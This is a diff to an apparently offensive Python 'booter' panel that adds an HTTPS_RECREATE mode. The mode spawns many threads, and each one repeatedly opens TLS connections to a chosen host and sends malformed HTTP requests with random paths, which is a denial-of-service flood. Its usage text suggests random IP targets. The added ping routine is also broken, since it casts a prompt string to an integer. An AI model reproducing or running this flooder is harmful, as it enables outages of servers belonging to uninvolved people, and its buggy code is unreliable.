@@ -1,5 +1,5 @@
 from colored import fg,bg,attr
-import socket,ssl,threading,random,string,sys,warnings,time
+import socket,ssl,threading,random,string,sys,warnings,time,requests
 from urllib.parse import urlparse
 import platform,os
 from colorama import Fore
@@ -128,6 +128,38 @@ def get_target(url):
     target['scheme'] = parsed_url.scheme
     target['port'] = parsed_url.port or ("443" if target['scheme'] == "https" else "80")
     return target
+
+def RECREATE_HTTPS(target,booter,METHODS):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((str(target['host']), int(target['port'])))
+        context = ssl.create_default_context()
+        ssl_sock = context.wrap_socket(sock, server_hostname=target['host'])
+        ssl_sock.do_handshake()
+        url_path = generate_url_path(1)
+        url_leak = ''
+        if target['uri'] == '/':
+            url_leak = target['uri']
+        else:
+            url_leak = '/'
+        byt = f"{METHODS} {url_leak} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
+        byt2 = f"{METHODS} /{url_path} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
+        for _ in range(booter):
+
+            ssl_sock.sendall(byt2)
+            ssl_sock.send(byt)
+
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((str(target['host']), int(target['port'])))
+            context = ssl.create_default_context()
+            ssl_sock = context.wrap_socket(sock, server_hostname=target['host'])
+            ssl_sock.do_handshake()
+    except:
+        pass
+
+def RUNNING_RECREATEHTTPS(thread_made,target,time_booter,METHODS):
+   for _ in range(int(thread_made)):
+           threading.Thread(target=RECREATE_HTTPS, args=(target, time_booter,METHODS)).start()
 
 def tls_test(target, run_time,methods):
     for _ in range(int(run_time)):
@@ -265,9 +297,44 @@ def PANEL_USE():
           print(f"{fg(136)}! REQUIRE PARAMETER ! {fg(196)}I need like this --> {fg(197)}TARGET {fg(198)}THREAD {fg(199)}TIME {fg(210)}HTTP_METHODS {attr(0)}")
           print(f"{fg(154)}EXAMPLE USE {random.choice(('HTPMIX','HTTPS_TLS.MIX','HTMIX'))} {fg(155)}https://{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)} {fg(156)}{random.randint(1,9999999)} {fg(157)}{random.randint(1,9999999)} {fg(158)}{random.choice(('GATEWAY','OPTIONS','HEAD','POST','GET'))} {attr(0)}")
     elif arg_load[0] == 'REG.1M' or arg_load[0] == 'REG-1M':
-       print(f"{fg(196)}CAN'T USE NOW (I NEED TEST){attr(0)}")
+       print(f"{fg(196)}SORRY GUY BECAUSE THIS METHODS USE MORE LINE (IDK NOW)!{attr(0)}")
+    elif arg_load[0] == 'HTPSRE' or arg_load[0] == 'HTTPS_RECREATE':
+        if len(arg_load) == 5:
+            url = str(arg_load[1]).lower()
+            thread_loader = int(arg_load[2])
+            time_booter = int(arg_load[3])
+            mode_tls = str(arg_load[4])
+            target = get_target(url)
+            RUNNING_RECREATEHTTPS(thread_loader,target,time_booter,mode_tls)
+        else:
+            print(f"{fg(136)}! REQUIRE PARAMETER ! {fg(196)}I need like this --> {fg(197)}TARGET {fg(198)}THREAD {fg(199)}TIME {fg(210)}HTTP_METHODS {attr(0)}")
+            print(f"{fg(154)}EXAMPLE USE {random.choice(('HTTPS_RECREATE','HTPSRE'))} {fg(155)}https://{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)} {fg(156)}{random.randint(1,9999999)} {fg(157)}{random.randint(1,9999999)} {fg(158)}{random.choice(('GATEWAY','OPTIONS','HEAD','POST','GET'))} {attr(0)}")
     elif arg_load[0] == 'PING':
-       print(f"{fg(196)}I'm lazy now For write ping system ;-;{attr(0)}")
+       methods_type = input(f"{Fore.GREEN}MODE_PING {Fore.WHITE}({Fore.YELLOW}l4{Fore.WHITE},{Fore.LIGHTYELLOW_EX}l7{Fore.WHITE}) ${Fore.RESET}")
+       if methods_type.upper() == 'L7' or methods_type.upper() == 'LAYER7' or methods_type.upper() == '7':
+           tar = str(input(f"{Fore.CYAN}URL {Fore.WHITE}${Fore.RESET}"))
+           try:
+               r = requests.get(url=tar)
+               print(f"{fg(34)}CONNECTION {fg(35)}STATUS_CODE={r.status_code} {fg(36)}REASON={r.reason}{attr(0)}")
+           except:
+               print(f"{fg(196)}CONNECTION {fg(197)}STATUS_CODE=NULL {fg(198)}REASON=NULL{attr(0)}")
+               pass
+       else:
+           status_code_tcp = False
+           IP = str(f'{Fore.LIGHTBLUE_EX}IP ${Fore.RESET}')
+           PORT = int(f'{Fore.BLUE}PORT ${Fore.RESET}')
+           try:
+               s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+               s.connect((IP,PORT))
+               s.send('HI?')
+               d = s.recv(9999999)
+               status_code_tcp = True
+           except:
+               status_code_tcp = False
+           if status_code_tcp == True:
+               print(f"{Fore.GREEN}CONNECTION=OK {Fore.LIGHTGREEN_EX}DATA_RECV={d.decode()}{Fore.RESET}")
+           else:
+               print(f"{Fore.RED}CONNECTION=NO {Fore.LIGHTRED_EX}DATA_RECV=NULL{Fore.RESET}")
     else:
        print(f"{fg(196)}{console_prompt} NOT FOUND COMMAND ! {attr(0)}")
     PANEL_USE()
